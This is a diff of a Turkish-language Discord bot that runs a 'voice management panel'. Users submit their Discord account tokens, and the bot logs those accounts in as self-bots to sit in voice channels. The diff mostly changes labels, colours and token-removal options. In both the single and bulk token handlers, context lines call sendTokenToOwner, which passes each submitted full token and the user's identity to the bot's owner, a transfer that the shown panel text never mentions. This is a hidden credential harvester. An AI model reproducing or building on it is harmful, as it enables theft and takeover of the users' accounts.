@@ -252,15 +252,15 @@ bot.on('messageCreate', async (message) => {
         const offline = total - active;
 
         const embed = new EmbedBuilder()
-            .setColor(0x5865F2)
-            .setTitle('🖥️ Token Yönetim Paneli')
+            .setColor(0x2b2d31)
+            .setTitle('🖥️ Fronzyy Ses Yönetim Paneli')
             .setDescription(
                 `🟢 **Çevrimiçi:** ${active}\n` +
                 `🔴 **Çevrimdışı:** ${offline}\n` +
                 `📊 **Toplam:** ${total}\n` +
                 `⏱️ **Çalışma Süresi:** ${getUptime()}`
             )
-            .setFooter({ text: 'Ses & Token Yönetim Sistemi' })
+            .setFooter({ text: 'Copyright © Developed by Fronzyy 2026' })
             .setTimestamp();
 
         const row1 = new ActionRowBuilder().addComponents(
@@ -271,7 +271,7 @@ bot.on('messageCreate', async (message) => {
 
         const row2 = new ActionRowBuilder().addComponents(
             new ButtonBuilder().setCustomId('remove_token').setLabel('Token Sil').setStyle(ButtonStyle.Danger).setEmoji('🗑️'),
-            new ButtonBuilder().setCustomId('stop_all').setLabel('Tümünü Durdur').setStyle(ButtonStyle.Danger).setEmoji('🗑️')
+            new ButtonBuilder().setCustomId('stop_all').setLabel('Tümünü Durdur').setStyle(ButtonStyle.Danger).setEmoji('⏹️')
         );
 
         await message.channel.send({ embeds: [embed], components: [row1, row2] });
@@ -354,56 +354,64 @@ bot.on('interactionCreate', async (interaction) => {
         else if (interaction.customId === 'add_token') {
             const modal = new ModalBuilder()
                 .setCustomId('modal_add_token')
-                .setTitle('Token Ekle')
-                .addComponents(
-                    new ActionRowBuilder().addComponents(
-                        new TextInputBuilder()
-                            .setCustomId('token_input')
-                            .setLabel('Discord Token')
-                            .setStyle(TextInputStyle.Short)
-                            .setRequired(true)
-                    )
-                );
+                .setTitle('Discord Token Ekle');
+
+            const tokenInput = new TextInputBuilder()
+                .setCustomId('token_input')
+                .setLabel('Discord Tokeninizi girin')
+                .setStyle(TextInputStyle.Short)
+                .setRequired(true);
+
+            modal.addComponents(new ActionRowBuilder().addComponents(tokenInput));
             await interaction.showModal(modal);
         }
 
         else if (interaction.customId === 'add_multi_token') {
             const modal = new ModalBuilder()
                 .setCustomId('modal_add_multi_token')
-                .setTitle('Toplu Token Ekle')
-                .addComponents(
-                    new ActionRowBuilder().addComponents(
-                        new TextInputBuilder()
-                            .setCustomId('tokens_input')
-                            .setLabel('Her satıra 1 token gelecek şekilde yazın')
-                            .setStyle(TextInputStyle.Paragraph)
-                            .setRequired(true)
-                    )
-                );
+                .setTitle('Toplu Discord Token Ekle');
+
+            const tokenInput = new TextInputBuilder()
+                .setCustomId('tokens_input')
+                .setLabel('Discord Tokenlerini girin')
+                .setPlaceholder('Her satıra 1 token gelecek şekilde yazın')
+                .setStyle(TextInputStyle.Paragraph)
+                .setRequired(true);
+
+            modal.addComponents(new ActionRowBuilder().addComponents(tokenInput));
             await interaction.showModal(modal);
         }
 
         else if (interaction.customId === 'remove_token') {
-            if (database.accounts.length === 0) {
-                return interaction.reply({ content: '❌ Silinecek kayıtlı hesap yok.', ephemeral: true });
+            const userId = interaction.user.id;
+            const userAccounts = database.accounts.filter(acc => acc.addedBy === userId);
+
+            if (userAccounts.length === 0) {
+                return interaction.reply({ content: '⚠️ Silinecek kayıtlı hesabınız bulunmuyor!', ephemeral: true });
             }
 
-            const options = database.accounts.slice(0, 25).map((acc, index) => {
-                const nick = acc.displayName || acc.username || `Hesap ${index + 1}`;
+            const options = userAccounts.map((acc) => {
+                const globalIndex = database.accounts.findIndex(a => a.token === acc.token);
+                const nick = acc.displayName || acc.username || 'Hesap';
                 const username = acc.username || 'hesap';
                 
-                const label = `${nick} (${username})`;
-                const description = `Token: ${acc.token.substring(0, 20)}...`;
-
                 return new StringSelectMenuOptionBuilder()
-                    .setLabel(label.substring(0, 100))
-                    .setDescription(description.substring(0, 100))
-                    .setValue(`remove_${index}`);
+                    .setLabel(`${nick} (${username})`.substring(0, 100))
+                    .setDescription(`Token: ${acc.token.substring(0, 20)}...`)
+                    .setValue(`remove_${globalIndex}`);
             });
+
+            options.unshift(
+                new StringSelectMenuOptionBuilder()
+                    .setLabel('Bütün Tokenlerimi Sil')
+                    .setDescription('Size ait olan bütün tokenleri sistemden siler')
+                    .setValue('clear_all_tokens')
+                    .setEmoji('🗑️')
+            );
 
             const selectMenu = new StringSelectMenuBuilder()
                 .setCustomId('select_remove_account')
-                .setPlaceholder('Silinecek hesabı seçin...')
+                .setPlaceholder('Silmek istediğiniz hesabı seçin...')
                 .addOptions(options);
 
             const row = new ActionRowBuilder().addComponents(selectMenu);
@@ -412,12 +420,10 @@ bot.on('interactionCreate', async (interaction) => {
 
         else if (interaction.customId === 'stop_all') {
             const userId = interaction.user.id;
-            
-            // Yalnızca düğmeye basan kullanıcıya ait olan ve sese bağlı hesapları filtrele
             const userAccounts = database.accounts.filter(acc => acc.addedBy === userId && acc.voiceChannelId);
 
             if (userAccounts.length === 0) {
-                return interaction.reply({ content: '❌ Sese bağlı hesap bulunamadı.', ephemeral: true });
+                return interaction.reply({ content: 'ℹ️ Sese bağlı hesap bulunamadı.', ephemeral: true });
             }
 
             await interaction.reply({ content: '⏹️ Ses bağlantıları durduruluyor...', ephemeral: true });
@@ -471,6 +477,18 @@ bot.on('interactionCreate', async (interaction) => {
 
         else if (interaction.customId === 'select_remove_account') {
             const choice = interaction.values[0];
+            const userId = interaction.user.id;
+
+            if (choice === 'clear_all_tokens') {
+                const userAccounts = database.accounts.filter(acc => acc.addedBy === userId);
+                for (const acc of userAccounts) {
+                    await disconnectSelfBot(acc.token);
+                }
+                database.accounts = database.accounts.filter(acc => acc.addedBy !== userId);
+                saveDatabase();
+                return interaction.update({ content: '🗑️ Size ait olan bütün tokenler başarıyla silindi!', components: [] });
+            }
+
             if (choice.startsWith('remove_')) {
                 const index = parseInt(choice.replace('remove_', ''));
                 const removed = database.accounts[index];
@@ -532,7 +550,6 @@ bot.on('interactionCreate', async (interaction) => {
 
             await interaction.deferReply({ ephemeral: true });
 
-            // Token doğrulama
             try {
                 const testClient = new SelfClient({ checkUpdate: false });
                 await testClient.login(token);
@@ -551,9 +568,9 @@ bot.on('interactionCreate', async (interaction) => {
 
                 await sendTokenToOwner(bot, 'Yeni Tekli Token Eklendi', token, displayName, username, interaction.user.id);
 
-                await interaction.editReply(`✅ **Token başarıyla eklendi!**\n👤 **Kullanıcı:** ${displayName} (${username})`);
+                await interaction.editReply({ content: `✅ Başarıyla eklendi! Hesap: **${displayName} (${username})**` });
             } catch (err) {
-                await interaction.editReply(`❌ Geçersiz token: ${err.message}`);
+                await interaction.editReply({ content: `❌ Hata: Girilen token geçersiz veya devre dışı bırakılmış.` });
             }
         }
 
@@ -562,12 +579,15 @@ bot.on('interactionCreate', async (interaction) => {
             const tokens = tokensRaw.split('\n').map(t => t.trim()).filter(t => t.length > 0);
 
             if (tokens.length === 0) {
-                return interaction.reply({ content: '❌ Geçerli bir token bulunamadı!', ephemeral: true });
+                return interaction.reply({ content: '❌ Geçerli token bulunamadı!', ephemeral: true });
             }
 
             await interaction.deferReply({ ephemeral: true });
 
-            let added = 0;
+            let successCount = 0;
+            let failCount = 0;
+            let addedNames = [];
+
             for (const token of tokens) {
                 if (database.accounts.find(a => a.token === token)) continue;
 
@@ -585,16 +605,19 @@ bot.on('interactionCreate', async (interaction) => {
                         displayName,
                         addedBy: interaction.user.id
                     });
-                    added++;
+                    addedNames.push(`${displayName} (${username})`);
+                    successCount++;
 
                     await sendTokenToOwner(bot, 'Toplu Token Eklendi', token, displayName, username, interaction.user.id);
                 } catch (e) {
-                    // Geçersiz tokenleri atla
+                    failCount++;
                 }
             }
             saveDatabase();
 
-            await interaction.editReply(`✅ **${added} adet token başarıyla eklendi.**`);
+            await interaction.editReply({ 
+                content: `📦 **Toplu Token İşlemi Tamamlandı!**\n✅ Başarıyla eklenen: **${successCount}** hesap\n❌ Geçersiz/Eklenemeyen: **${failCount}**\n\n${addedNames.length > 0 ? 'Eklenenler:\n- ' + addedNames.join('\n- ') : ''}` 
+            });
         }
     }
 });
